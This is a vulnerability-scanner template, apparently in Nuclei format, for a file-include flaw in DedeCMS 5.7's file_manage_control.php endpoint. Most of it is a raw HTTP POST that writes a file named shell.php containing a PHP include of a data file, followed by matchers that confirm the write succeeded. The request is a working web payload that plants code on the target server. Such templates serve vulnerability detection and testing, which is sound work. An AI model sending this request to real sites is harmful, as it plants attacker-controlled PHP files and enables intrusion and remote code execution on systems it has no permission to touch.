id: dedecms-file-manage-control-file-include

info:
  name: DedeCMS 5.7 file_manage_control.php File Include
  author: ProjectDiscoveryAI
  severity: high
  description: |
    The DedeCMS 5.7 file_manage_control.php endpoint is vulnerable to a file include vulnerability that allows attackers to include arbitrary files.
  tags: dedecms,lfi,rce

http:
  - raw:
      - |
        POST /dede/file_manage_control.php HTTP/1.1
        Host: {{Hostname}}
        Content-Length: 135
        Cache-Control: max-age=0
        Upgrade-Insecure-Requests: 1
        Origin: http://{{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Referer: http://{{Hostname}}/dede/article_allowurl_edit.php
        Accept-Encoding: gzip, deflate, br
        Accept-Language: en,zh-CN;q=0.9,zh;q=0.8
        Cookie: 
        Connection: close

        fmdo=edit&backurl=&token=&activepath=&filename=shell.php&str=%3C%3Fphp+include_once%28%22.%2Fdata%2Fadmin%2Fallowurl.txt%22%29%3B%3F%3E

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "成功保存"
        part: body
